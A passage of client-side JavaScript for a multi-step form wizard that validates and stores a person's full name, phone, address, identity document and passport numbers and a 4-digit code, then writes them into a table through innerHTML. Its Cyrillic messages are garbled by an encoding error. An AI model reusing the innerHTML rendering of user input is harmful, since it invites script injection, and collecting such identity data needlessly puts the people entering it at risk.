              return false;
            }
            if (!re.test(val)) {
              error.textContent = '–§–ò–û –¥–æ–ª–∂–Ω–æ —Å–æ–¥–µ—Ä–∂–∞—Ç—å —Ç–æ–ª—å–∫–æ –±—É–∫–≤—ã –∫–∏—Ä–∏–ª–ª–∏—Ü—ã';
              return false;
            }
            error.textContent = '';
            return true;
          },
          phone: () => {
            const val = this.sanitizeInput(document.getElementById('phone').value.trim());
            const digits = val.replace(/[^0-9]/g, '');
            const error = document.getElementById('err-phone');
            if (!val) {
              error.textContent = '–ü–æ–ª–µ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è';
              return false;
            }
            if (!val.startsWith('+7') && !val.startsWith('7')) {
              error.textContent = '–ù–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å +7 –∏–ª–∏ 7';
              return false;
            }
            if (digits.length < 10 || digits.length > 11) {
              error.textContent = '–ù–æ–º–µ—Ä –¥–æ–ª–∂–µ–Ω —Å–æ–¥–µ—Ä–∂–∞—Ç—å 10 –∏–ª–∏ 11 —Ü–∏—Ñ—Ä';
              return false;
            }
            error.textContent = '';
            return true;
          },
          address: () => {
            const val = this.sanitizeInput(document.getElementById('address').value.trim());
            const error = document.getElementById('err-address');
            if (!val) {
              error.textContent = '–ü–æ–ª–µ –∞–¥—Ä–µ—Å–∞ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è';
              return false;
            }
            error.textContent = '';
            return true;
          },
          'document-number': () => {
            const val = this.sanitizeInput(document.getElementById('docnumber').value.trim());
            const error = document.getElementById('err-doc');
            if (!val) {
              error.textContent = '–ü–æ–ª–µ –Ω–æ–º–µ—Ä–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ';
              return false;
            }
            error.textContent = '';
            return true;
          },
          code: () => {
            const val = this.sanitizeInput(document.getElementById('code').value.trim());
            const re = /^\d{4}$/;
            const error = document.getElementById('err-code');
            if (!val) {
              error.textContent = '–ü–æ–ª–µ –∫–æ–¥–∞ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –¥–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è';
              return false;
            }
            if (!re.test(val)) {
              error.textContent = '–ö–æ–¥ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å 4-–∑–Ω–∞—á–Ω—ã–º —á–∏—Å–ª–æ–º';
              return false;
            }
            error.textContent = '';
            return true;
          },
          'status-number': () => {
            const val = this.sanitizeInput(document.getElementById('status-number').value.trim());
            const error = document.getElementById('err-status-number');
            if (!val) {
              error.textContent = '–ü–æ–ª–µ –Ω–æ–º–µ—Ä–∞ –∑–∞—è–≤–∫–∏ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ';
              return false;
            }
            error.textContent = '';
            return true;
          },
          'status-passport': () => {
            const val = this.sanitizeInput(document.getElementById('status-passport').value.trim());
            const error = document.getElementById('err-status-passport');
            if (!val) {
              error.textContent = '–ü–æ–ª–µ –ø–∞—Å–ø–æ—Ä—Ç–∞ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ';
              return false;
            }
            error.textContent = '';
            return true;
          }
        };

        return validations[step]?.() ?? true;
      }

      saveData() {
        const timestamp = new Date().toLocaleString('ru-RU');
        const record = {
          timestamp,
          fullname: this.formData.fullname || '',
          phone: this.formData.phone || '',
          address: this.formData.address || '',
          document: `${this.formData['document-type'] || ''} ${this.formData['document-number'] || ''}`.trim(),
          code: this.formData.code || ''
        };
        this.dataStore.push(record);
      }

      renderDataTable() {
        const tbody = document.getElementById('data-table-body');
        if (tbody) {
          tbody.innerHTML = '';
          this.dataStore.forEach(record => {
            const tr = document.createElement('tr');
            tr.innerHTML = `
              <td>${record.timestamp}</td>
              <td>${record.fullname}</td>
              <td>${record.phone}</td>
              <td>${record.address}</td>
              <td>${record.document}</td>
              <td>${record.code}</td>
            `;
            tbody.appendChild(tr);
          });
        } else {
          console.error('Data table body element not found!');
        }
      }
    }

    const wizard = new MFCWizard();
  </script>
